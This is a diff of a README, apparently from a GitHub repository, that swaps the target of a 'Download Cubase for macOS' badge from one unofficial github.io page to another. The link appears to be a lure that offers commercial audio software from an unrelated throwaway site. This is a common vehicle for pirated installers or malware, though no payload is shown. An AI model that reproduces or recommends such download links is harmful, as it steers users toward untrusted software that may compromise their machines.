@@ -4,7 +4,7 @@
 
 ## 📥 Download Cubase for macOS
 
-[![⬇️ Download Cubase Mac](https://img.shields.io/badge/Download-Cubase%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Steinberg)
+[![⬇️ Download Cubase Mac](https://img.shields.io/badge/Download-Cubase%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Steinberg)
 
 ---
 
